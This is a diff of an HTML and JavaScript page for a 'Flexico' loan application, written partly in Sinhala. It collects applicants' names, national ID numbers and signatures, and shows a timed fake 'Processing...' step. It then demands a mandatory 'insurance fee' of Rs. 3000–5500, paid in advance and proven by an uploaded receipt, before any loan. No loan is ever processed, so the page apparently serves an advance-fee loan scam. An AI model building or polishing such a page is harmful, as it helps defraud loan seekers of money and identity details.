@@ -21,19 +21,10 @@ body{
     border-radius:16px;
     box-shadow:0 10px 25px rgba(0,0,0,.08);
 }
-h3{
-    text-align:center;
-    font-size:20px;
-    margin-bottom:14px;
-    color:#1e293b;
-}
-label{
-    font-size:13px;
-    font-weight:600;
-    color:#334155;
-    margin-top:10px;
-    display:block;
-}
+h3{text-align:center;margin-bottom:14px}
+
+label{font-size:13px;font-weight:600;margin-top:10px;display:block}
+
 input,button{
     width:100%;
     padding:12px;
@@ -42,6 +33,7 @@ input,button{
     border:1px solid #cbd5e1;
     font-size:15px;
 }
+
 button{
     background:#2563eb;
     color:#fff;
@@ -51,6 +43,12 @@ button{
     font-weight:600;
     cursor:pointer;
 }
+
+button.loading{
+    pointer-events:none;
+    background:#94a3b8;
+}
+
 .step{display:none}
 .step.active{display:block}
 
@@ -72,33 +70,12 @@ button{
     border-radius:12px;
 }
 
-.status{
-    text-align:center;
-    background:#fff7ed;
-    padding:12px;
-    border-radius:12px;
-    color:#c2410c;
-    font-weight:700;
-}
-
-.loader{
-    width:42px;
-    height:42px;
-    border:4px solid #e5e7eb;
-    border-top:4px solid #2563eb;
-    border-radius:50%;
-    margin:20px auto;
-    animation:spin 1s linear infinite;
-}
-@keyframes spin{100%{transform:rotate(360deg)}}
-
 .success{
     background:#dcfce7;
     padding:18px;
     border-radius:14px;
     text-align:center;
     font-weight:700;
-    color:#166534;
 }
 </style>
 </head>
@@ -117,18 +94,10 @@ button{
 <input id="loanAmount" type="number">
 
 <label>NIC Number</label>
-<input id="nic">
+<input>
 
 <label>Signature</label>
 <canvas id="signature"></canvas>
-
-<div class="declaration">
-Flexico ආයතනය මගින් ලබා ගන්නා මෙම මුදල නියමිත කාල වකවානු වලට අනුව
-මම ගෙවන බව මෙයින් පොරොන්දු වෙමි.
-<br><br>
-නියමිත දිනයට ගෙවාගැනීමට අපොහොසත් වූ විට,
-දවසකට රුපියල් 50 ක දඩ මුදලකට යටත් වන බවට එකඟ වෙමි.
-</div>
 
 <button onclick="goStep2()">Next</button>
 </div>
@@ -139,8 +108,7 @@ Flexico ආයතනය මගින් ලබා ගන්නා මෙම ම�
 <p><b>Name:</b> <span id="n"></span></p>
 <p><b>Amount:</b> Rs. <span id="a"></span></p>
 
-<div class="status">Loan Pending</div>
-<button onclick="goStep3()">Next</button>
+<button id="step2Btn" onclick="autoToStep3()">Processing...</button>
 </div>
 
 <!-- STEP 3 -->
@@ -151,13 +119,12 @@ Flexico ආයතනය මගින් ලබා ගන්නා මෙම ම�
 <p><b>Insurance Fee:</b> Rs. <span id="ins"></span></p>
 
 <div class="declaration">
-මෙම ණය මුදල් ලබා ගැනීම සඳහා <b>රක්ෂණ මුදල ගෙවීම අනිවාර්යයි</b>.
+ඔබ මෙම ණය මුදල ලබා ගැනීම සඳහා
+<b>Rs. <span id="autoFee"></span></b>
+ක රක්ෂණ මුදලක් ගෙවිය යුතුය.
 <br><br>
-කරුණාකර රක්ෂණ මුදල ගෙවා, එහි <b>Payment Receipt</b> එක මෙතන Upload කරන්න.
-<br><br>
-Receipt එක upload කිරීමෙන් පසු, ඔබගේ ගිණුමට
-<b>පැයක් ඇතුළත</b> මුදල් ලැබෙන අතර,
-මෙය <b>ස්වයංක්‍රීයව</b> සිදුවන ක්‍රියාවලියකි.
+කරුණාකර මෙම රක්ෂණ ගෙවීම සිදු කර,
+ඒ සඳහා ලැබුණු Receipt එක මෙතන Upload කරන්න.
 </div>
 
 <label>Upload Insurance Payment Receipt</label>
@@ -166,24 +133,10 @@ Receipt එක upload කිරීමෙන් පසු, ඔබගේ ගිණ
 <button onclick="confirmPayment()">Next</button>
 </div>
 
-<!-- STEP 4 -->
+<!-- STEP 4 (FINAL) -->
 <div class="step" id="s4">
-<h3>Processing</h3>
-<div class="loader"></div>
-<p style="text-align:center">Please wait...</p>
-</div>
-
-<!-- STEP 5 -->
-<div class="step" id="s5">
 <div class="success">
-✔ Loan Process Completed Successfully
-</div>
-
-<div class="declaration" style="margin-top:16px">
-ඔබගේ රක්ෂණ ගෙවීම සාර්ථකව ලබාගෙන ඇත.
-<br><br>
-ඔබගේ ණය මුදල <b>පැයක් ඇතුළත</b> ඔබගේ ගිණුමට
-ස්වයංක්‍රීයව බැර කෙරේ.
+✔ Insurance Payment Submitted Successfully
 </div>
 </div>
 
@@ -196,60 +149,48 @@ function show(i){
 }
 
 function goStep2(){
-    const name = document.getElementById("customerName").value.trim();
-    const amount = document.getElementById("loanAmount").value.trim();
-
-    if(name === "" || amount === ""){
-        alert("⚠ කරුණාකර Name සහ Loan Amount පුරවන්න");
-        return;
-    }
-
-    document.getElementById("n").innerText = name;
-    document.getElementById("a").innerText = amount;
+    const name=document.getElementById("customerName").value.trim();
+    const amount=document.getElementById("loanAmount").value.trim();
+    if(!name||!amount){alert("Name සහ Amount පුරවන්න");return;}
+    n.innerText=name;
+    a.innerText=amount;
     show(2);
 }
 
-function goStep3(){
-    const amt = parseInt(document.getElementById("loanAmount").value);
-    const fee = amt <= 100000 ? 3000 : amt <= 300000 ? 4500 : 5500;
+function autoToStep3(){
+    const btn=document.getElementById("step2Btn");
+    btn.classList.add("loading");
+    btn.innerText="Processing...";
+    setTimeout(goStep3,3000);
+}
 
-    document.getElementById("fa").innerText = amt;
-    document.getElementById("ins").innerText = fee;
+function goStep3(){
+    const amt=parseInt(document.getElementById("loanAmount").value);
+    const fee=amt<=100000?3000:amt<=300000?4500:5500;
+    fa.innerText=amt;
+    ins.innerText=fee;
+    autoFee.innerText=fee;
     show(3);
 }
 
 function confirmPayment(){
-    const receipt = document.getElementById("receipt");
-    if(receipt.files.length === 0){
-        alert("⚠ Insurance payment receipt upload කරන්න");
-        return;
-    }
+    if(!receipt.files.length){alert("Receipt upload කරන්න");return;}
     show(4);
-    setTimeout(()=>show(5),4000);
 }
 
 /* Signature */
-const canvas = document.getElementById("signature");
-const ctx = canvas.getContext("2d");
-canvas.width = canvas.offsetWidth;
-canvas.height = canvas.offsetHeight;
-
+const canvas=document.getElementById("signature");
+const ctx=canvas.getContext("2d");
+canvas.width=canvas.offsetWidth;
+canvas.height=canvas.offsetHeight;
 let draw=false;
 canvas.addEventListener("pointerdown",e=>{
-    draw=true;
-    ctx.beginPath();
-    ctx.moveTo(e.offsetX,e.offsetY);
+    draw=true;ctx.beginPath();ctx.moveTo(e.offsetX,e.offsetY);
 });
 canvas.addEventListener("pointermove",e=>{
-    if(!draw) return;
-    ctx.lineWidth=2;
-    ctx.lineCap="round";
-    ctx.lineTo(e.offsetX,e.offsetY);
-    ctx.stroke();
+    if(!draw)return;ctx.lineTo(e.offsetX,e.offsetY);ctx.stroke();
 });
 canvas.addEventListener("pointerup",()=>draw=false);
-canvas.addEventListener("pointerleave",()=>draw=false);
-canvas.addEventListener("pointercancel",()=>draw=false);
 </script>
 
 </body>
